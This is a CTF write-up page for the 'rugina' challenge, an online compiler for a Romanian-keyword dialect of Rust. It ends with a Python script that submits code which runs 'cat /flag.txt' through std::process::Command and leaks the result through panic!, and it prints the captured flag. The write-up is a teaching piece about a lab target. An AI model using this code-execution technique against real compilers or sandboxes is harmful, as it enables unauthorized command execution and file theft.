<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTF Writeup - rugina Challenge</title>
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #e0e0e0;
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background-color: #1a1a1a;
        }

        header {
            background-color: #121212;
            color: white;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
            border-left: 4px solid #0d7377;
        }

        header h1 {
            margin: 0;
            font-size: 2.2em;
            color: #0d7377;
        }

        .challenge-info {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 15px;
        }

        .challenge-info div {
            background-color: #222;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.9em;
        }

        .container {
            background-color: #222;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
        }

        h2 {
            color: #0d7377;
            border-bottom: 2px solid #333;
            padding-bottom: 10px;
        }

        h3 {
            color: #14ffec;
            margin-top: 25px;
        }

        pre {
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            padding: 0;
        }

        code {
            font-family: 'Consolas', 'Monaco', monospace;
            border-radius: 5px;
        }

        .description {
            background-color: #2a2a2a;
            border-left: 4px solid #0d7377;
            padding: 10px 20px;
            margin: 20px 0;
        }

        .flag {
            background-color: #1c3b1c;
            color: #00ff7f;
            padding: 10px 20px;
            border-left: 4px solid #00ff7f;
            margin: 20px 0;
            font-weight: bold;
            font-family: 'Consolas', 'Monaco', monospace;
        }

        .step {
            margin-bottom: 30px;
        }

        .step-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #14ffec;
        }

        ul {
            padding-left: 20px;
        }

        ul li {
            margin-bottom: 8px;
        }

        .references a {
            color: #14ffec;
            text-decoration: none;
        }

        .references a:hover {
            text-decoration: underline;
            color: #0d7377;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 0.9em;
            color: #777;
        }

        img {
            max-width: 100%;
            height: auto;
            border: 1px solid #444;
            border-radius: 4px;
            padding: 5px;
            margin: 10px 0;
        }

        .command {
            background-color: #151515;
            color: #14ffec;
            padding: 10px 15px;
            border-radius: 5px;
            margin: 15px 0;
            font-family: 'Consolas', 'Monaco', monospace;
            border-left: 4px solid #0d7377;
        }

        .output {
            background-color: #1a1a1a;
            padding: 10px 15px;
            border-radius: 5px;
            border-left: 4px solid #444;
            margin: 15px 0;
            font-family: 'Consolas', 'Monaco', monospace;
            color: #ddd;
        }

        .error-output {
            background-color: #2a1515;
            padding: 10px 15px;
            border-radius: 5px;
            border-left: 4px solid #cc4444;
            margin: 15px 0;
            font-family: 'Consolas', 'Monaco', monospace;
            color: #ffaaaa;
        }

        .highlight-section {
            background-color: #1a1a1a;
            border-left: 4px solid #14ffec;
            padding: 15px;
            margin: 20px 0;
        }

        a {
            color: #14ffec;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        .emoji {
            font-size: 1.2em;
            margin-right: 5px;
        }

        .key-point {
            border-left: 3px solid #ff7e67;
            padding-left: 15px;
            margin: 15px 0;
            background-color: rgba(255, 126, 103, 0.1);
        }

        .language-mapping {
            background-color: #1a1a1a;
            border: 1px solid #444;
            border-radius: 5px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Consolas', 'Monaco', monospace;
        }

        /* Custom Scrollbar */
        *::-webkit-scrollbar {
            width: 12px;
            height: 12px;
        }

        *::-webkit-scrollbar-track {
            background: #1a1a1a;
            border-radius: 10px;
            border: 1px solid #2a2a2a;
        }

        *::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #0d7377 0%, #14ffec 100%);
            border-radius: 10px;
            border: 2px solid #1a1a1a;
        }

        *::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, #14ffec 0%, #0d7377 100%);
            box-shadow: 0 0 8px rgba(20, 255, 236, 0.6);
        }

        *::-webkit-scrollbar-corner {
            background: #1a1a1a;
        }

        /* Firefox */
        * {
            scrollbar-width: thin;
            scrollbar-color: #0d7377 #1a1a1a;
        }
    </style>
</head>

<body>
    <header>
        <h1>🦀 Challenge: rugina</h1>
        <div class="challenge-info">
            <div>🏆 CTF@AC</div>
            <div>🎯 Category: Misc</div>
            <div>💯 Points: 100</div>
            <div>📊 Solves: 36</div>
            <div>👤 Author: thek0der</div>
            <div>👤 Solver: IRVANNI/CuboConNoveQuadrati</div>
        </div>
    </header>

    <div class="container">
        <h2>📝 Challenge Description</h2>
        <div class="description">
            <p>Aren't you tired of rust? I found the perfect solution for you! Welcome to Rugină. Since there is no compiler for it yet, I made one for you.</p>
        </div>

        <p><strong>🌐 Web Interface:</strong> <a href="http://ctf.ac.upt.ro:9811/">http://ctf.ac.upt.ro:9811/</a></p>
    </div>

    <div class="container">
        <h2>🔍 Initial Exploration</h2>
        <p>Visiting the provided web interface, I was greeted by an online compiler for a mysterious programming language called "Rugină." The name itself was intriguing - it sounded like it might be related to Rust, but with some kind of twist.</p>

        <div class="key-point">
            <p>🕵️ <strong>First Observations:</strong></p>
            <ul>
                <li>📝 Online compiler interface for "Rugină" language</li>
                <li>🦀 Name suggests connection to Rust programming language</li>
                <li>❓ No immediate documentation or syntax examples</li>
                <li>🎯 Need to figure out the language syntax to proceed</li>
            </ul>
        </div>

        <p>Since I had never heard of "Rugină" before, my first instinct was to research this language online to understand its syntax and capabilities.</p>
    </div>

    <div class="container">
        <h2>🛠️ Research and Discovery</h2>

        <div class="step">
            <h3>🔎 Step 1: Language Research</h3>
            <p>A quick search for "Rugină programming language" led me to an incredibly useful GitHub repository:</p>
            
            <div class="command">
                https://github.com/aionescu/rugina
            </div>
            
            <p>This repository was a goldmine! It contained:</p>
            <ul>
                <li>📖 Examples of Rugină code syntax</li>
                <li>🗺️ Mapping of Rust keywords to their Rugină equivalents</li>
                <li>📋 Documentation of language features</li>
            </ul>
            
            <div class="highlight-section">
                <p>💡 <strong>Key Discovery:</strong> Rugină is essentially Rust with Romanian keyword translations! "Rugină" means "rust" in Romanian.</p>
            </div>
        </div>

        <div class="step">
            <h3>📚 Step 2: Understanding the Syntax Mapping</h3>
            <p>From the GitHub repository's <code>lib.rs</code> file, I discovered the keyword mappings:</p>
            
            <div class="language-mapping">
                Rust → Rugină Mappings:<br>
                fn → funcție<br>
                main → principal<br>
                let → fie<br>
                mut → mut (unchanged)<br>
                if → dacă<br>
                else → altfel<br>
                ... (and many more)
            </div>
            
            <p>According to the documentation, a basic main function should be written as:</p>
            
            <div class="command">
                funcție! principal() {}
            </div>
        </div>

        <div class="step">
            <h3>🧪 Step 3: First Attempt and Error Analysis</h3>
            <p>I tried to write my first program using the documented syntax, but encountered an unexpected error:</p>
            
            <div class="command">
                funcție! principal() {}
            </div>
            
            <div class="error-output">
                error: expected one of `(`, `[`, or `{`, found keyword `fn`<br>
                --> main.rs:1:10<br>
                |<br>
                1 | funcție! fn main(){}<br>
                |          ^^ expected one of `(`, `[`, or `{`<br>
                error: aborting due to 1 previous error
            </div>
            
            <div class="key-point">
                <p>🔍 <strong>Critical Insight:</strong> The error message revealed that when the compiler sees "principal," it automatically inserts "fn main." This means I shouldn't use the "funcție!" part!</p>
            </div>
            
            <p>After several tests, I discovered the correct syntax:</p>
            
            <div class="command">
                principal() {
                    // my code here
                }
            </div>
        </div>

        <div class="step">
            <h3>🎯 Step 4: Finding the Flag</h3>
            <p>With the syntax figured out, I needed to locate the flag. Since this was likely a server-side challenge, I suspected the flag might be in a file on the system. My approach was to execute shell commands from within the Rugină code.</p>
            
            <p>However, I quickly discovered that some Rust commands were blocked or restricted, so I needed to be selective about which functions to use.</p>
            
            <p>I also found that standard output methods like <code>println!</code> weren't working as expected, but I discovered a creative workaround: using <code>panic!</code> to display the output! 💡</p>
        </div>

        <div class="step">
            <h3>🐍 Step 5: Final Solution</h3>
            <p>I developed a solution that combined Rust's process execution capabilities with the panic-based output method:</p>

            <pre><code class="language-python">import requests

url = "http://ctf.ac.upt.ro:9811/"

code = """\
principal() {
    use std::process::Command;
    let output = Command::new("cat")
        .arg("/flag.txt")
        .output()
        .expect("failed to execute command");
    let result = String::from_utf8_lossy(&output.stdout);
    panic!("{}", result);
}"""

r = requests.post(url+"run", json={'code': code})
print("Flag:", r.text.splitlines()[1])</code></pre>

            <p>🧠 <strong>How this works:</strong></p>
            <ol>
                <li>Use <code>principal()</code> as the entry point (automatically becomes <code>fn main()</code>)</li>
                <li>Import Rust's <code>std::process::Command</code> for system command execution</li>
                <li>Execute <code>cat /flag.txt</code> to read the flag file</li>
                <li>Convert the output to a string</li>
                <li>Use <code>panic!</code> to display the result (since normal print functions were restricted)</li>
                <li>Parse the panic output from the HTTP response</li>
            </ol>
        </div>

        <div class="step">
            <h3>🏁 Step 6: Flag Capture</h3>
            <p>Running the script successfully executed the system command and revealed the flag through the panic output! The creative use of error handling as an output method was key to bypassing the restrictions. 🎊</p>
            
            <div class="flag">
                🚩 ctf{73523e676b04e1c2db176d8035648893648b969f5ddf5ac40f8fc5b6c15d8692}
            </div>
        </div>
    </div>

    <div class="container">
        <h2>🧠 Technical Insights</h2>
        <h3>About Rugină</h3>
        <p>Rugină is a fascinating project that translates Rust syntax into Romanian. Key characteristics:</p>
        <ul>
            <li>🌍 Romanian localization of Rust keywords</li>
            <li>🦀 Maintains Rust's core functionality and safety features</li>
            <li>📚 Demonstrates how programming languages can be localized</li>
            <li>🛠️ Uses compiler transformations to map keywords</li>
        </ul>
        
        <h3>The Compiler Behavior</h3>
        <p>The challenge's compiler had some interesting quirks:</p>
        <ul>
            <li>Automatic transformation of "principal" to "fn main"</li>
            <li>Restricted access to certain standard library functions</li>
            <li>Error-based output as a workaround for print restrictions</li>
            <li>Full access to system commands through std::process</li>
        </ul>
    </div>

    <div class="container">
        <h2>🎯 Key Takeaways</h2>
        <ul>
            <li>🔍 <strong>Research First:</strong> When encountering unknown technologies, GitHub is often your best friend</li>
            <li>🧪 <strong>Test and Iterate:</strong> Error messages can provide valuable clues about system behavior</li>
            <li>💡 <strong>Creative Problem Solving:</strong> When normal methods are blocked, think outside the box</li>
            <li>🌍 <strong>Language Localization:</strong> Programming languages can be adapted for different cultures</li>
            <li>⚠️ <strong>Error as Feature:</strong> Sometimes "failures" like panic! can be repurposed as solutions</li>
            <li>🛡️ <strong>Security Through Obscurity:</strong> Unusual languages can add an extra layer of challenge</li>
        </ul>
    </div>

    <div class="container">
        <h2>🔗 References</h2>
        <div class="references">
            <p><strong>Rugină GitHub Repository:</strong> <a href="https://github.com/aionescu/rugina">https://github.com/aionescu/rugina</a></p>
            <p>This repository was instrumental in understanding the language syntax and keyword mappings.</p>
        </div>
    </div>

    <div class="footer">
        <p>🏆 © 2025 - Writeup created by IRVANNI/CuboConNoveQuadrati | Happy hacking! 🦀</p>
    </div>
</body>

</html>
